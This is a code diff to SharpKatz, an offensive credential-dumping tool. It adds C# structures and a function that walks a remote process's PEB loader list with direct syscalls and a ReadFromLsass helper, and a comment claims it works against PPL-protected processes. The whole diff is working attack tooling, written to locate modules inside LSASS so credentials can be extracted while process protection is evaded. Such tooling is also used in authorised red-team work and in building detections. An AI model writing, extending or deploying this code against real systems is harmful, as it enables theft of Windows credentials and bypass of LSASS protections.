@@ -2838,5 +2838,137 @@ namespace SharpKatz.Win32
             SysCall.Delegates.LsaNtStatusToWinError LsaNtStatusToWinError = (SysCall.Delegates.LsaNtStatusToWinError)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.LsaNtStatusToWinError));
             return LsaNtStatusToWinError(status);
         }
+        // --- PEB / LDR structures for module enumeration via NtQueryInformationProcess ---
+
+        public enum PROCESSINFOCLASS : int
+        {
+            ProcessBasicInformation = 0
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct PROCESS_BASIC_INFORMATION
+        {
+            public IntPtr ExitStatus;
+            public IntPtr PebBaseAddress;
+            public IntPtr AffinityMask;
+            public IntPtr BasePriority;
+            public UIntPtr UniqueProcessId;
+            public IntPtr InheritedFromUniqueProcessId;
+        }
+
+        // Partial PEB — only need Ldr pointer (offset 0x18 on x64)
+        [StructLayout(LayoutKind.Explicit)]
+        public struct PEB
+        {
+            [FieldOffset(0x18)]
+            public IntPtr Ldr; // PEB_LDR_DATA*
+        }
+
+        // PEB_LDR_DATA — InLoadOrderModuleList at offset 0x10 on x64
+        [StructLayout(LayoutKind.Explicit)]
+        public struct PEB_LDR_DATA
+        {
+            [FieldOffset(0x10)]
+            public LIST_ENTRY InLoadOrderModuleList;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct LIST_ENTRY
+        {
+            public IntPtr Flink;
+            public IntPtr Blink;
+        }
+
+        // LDR_DATA_TABLE_ENTRY (partial — InLoadOrderLinks at offset 0)
+        [StructLayout(LayoutKind.Sequential)]
+        public struct LDR_DATA_TABLE_ENTRY
+        {
+            public LIST_ENTRY InLoadOrderLinks;        // +0x00
+            public LIST_ENTRY InMemoryOrderLinks;      // +0x10
+            public LIST_ENTRY InInitializationOrderLinks; // +0x20
+            public IntPtr DllBase;                     // +0x30
+            public IntPtr EntryPoint;                  // +0x38
+            public uint SizeOfImage;                   // +0x40
+            public uint _pad;
+            public UNICODE_STRING FullDllName;         // +0x48
+            public UNICODE_STRING BaseDllName;         // +0x58
+        }
+
+        /// <summary>
+        /// Enumerate modules of a remote process by walking PEB->Ldr->InLoadOrderModuleList.
+        /// Uses NtReadVirtualMemory (syscall) — works on PPL-protected processes when
+        /// the handle has PROCESS_QUERY_INFORMATION | PROCESS_VM_READ.
+        /// </summary>
+        public static Dictionary<string, IntPtr> EnumerateModulesFromPeb(IntPtr hProcess)
+        {
+            var modules = new Dictionary<string, IntPtr>(StringComparer.OrdinalIgnoreCase);
+
+            // Step 1: NtQueryInformationProcess → PROCESS_BASIC_INFORMATION → PebBaseAddress
+            PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
+            int pbiSize = Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION));
+            uint returnLength = 0;
+
+            NTSTATUS status = SysCall.NtQueryInformationProcess10(
+                hProcess, PROCESSINFOCLASS.ProcessBasicInformation,
+                ref pbi, (uint)pbiSize, ref returnLength);
+
+            if (status != NTSTATUS.Success || pbi.PebBaseAddress == IntPtr.Zero)
+                return modules;
+
+            // Step 2: Read PEB.Ldr pointer
+            int ldrOffset = Marshal.OffsetOf(typeof(PEB), "Ldr").ToInt32();
+            byte[] ldrBytes = Utility.ReadFromLsass(ref hProcess, IntPtr.Add(pbi.PebBaseAddress, ldrOffset), IntPtr.Size);
+            if (ldrBytes == null || ldrBytes.Length < IntPtr.Size) return modules;
+
+            IntPtr ldrAddr = new IntPtr(BitConverter.ToInt64(ldrBytes, 0));
+            if (ldrAddr == IntPtr.Zero) return modules;
+
+            // Step 3: Read PEB_LDR_DATA.InLoadOrderModuleList (list head Flink)
+            int listOffset = Marshal.OffsetOf(typeof(PEB_LDR_DATA), "InLoadOrderModuleList").ToInt32();
+            byte[] listHeadBytes = Utility.ReadFromLsass(ref hProcess, IntPtr.Add(ldrAddr, listOffset), IntPtr.Size);
+            if (listHeadBytes == null || listHeadBytes.Length < IntPtr.Size) return modules;
+
+            IntPtr listHeadAddr = IntPtr.Add(ldrAddr, listOffset); // address of list head itself
+            IntPtr current = new IntPtr(BitConverter.ToInt64(listHeadBytes, 0));
+
+            // Step 4: Walk linked list
+            int entrySize = Marshal.SizeOf(typeof(LDR_DATA_TABLE_ENTRY));
+            int maxModules = 200;
+
+            while (current != listHeadAddr && current != IntPtr.Zero && maxModules-- > 0)
+            {
+                byte[] entryBytes = Utility.ReadFromLsass(ref hProcess, current, entrySize);
+                if (entryBytes == null || entryBytes.Length < entrySize) break;
+
+                // Parse entry
+                GCHandle pin = GCHandle.Alloc(entryBytes, GCHandleType.Pinned);
+                LDR_DATA_TABLE_ENTRY entry;
+                try
+                {
+                    entry = (LDR_DATA_TABLE_ENTRY)Marshal.PtrToStructure(
+                        pin.AddrOfPinnedObject(), typeof(LDR_DATA_TABLE_ENTRY));
+                }
+                finally { pin.Free(); }
+
+                // Read BaseDllName string
+                if (entry.BaseDllName.Length > 0 && entry.BaseDllName.Buffer != IntPtr.Zero && entry.DllBase != IntPtr.Zero)
+                {
+                    byte[] nameBytes = Utility.ReadFromLsass(ref hProcess, entry.BaseDllName.Buffer, entry.BaseDllName.MaximumLength);
+                    if (nameBytes != null)
+                    {
+                        string moduleName = Encoding.Unicode.GetString(nameBytes).TrimEnd('\0');
+                        if (!string.IsNullOrEmpty(moduleName) && !modules.ContainsKey(moduleName))
+                        {
+                            modules[moduleName] = entry.DllBase;
+                        }
+                    }
+                }
+
+                // Next entry (Flink)
+                current = entry.InLoadOrderLinks.Flink;
+            }
+
+            return modules;
+        }
     }
 }
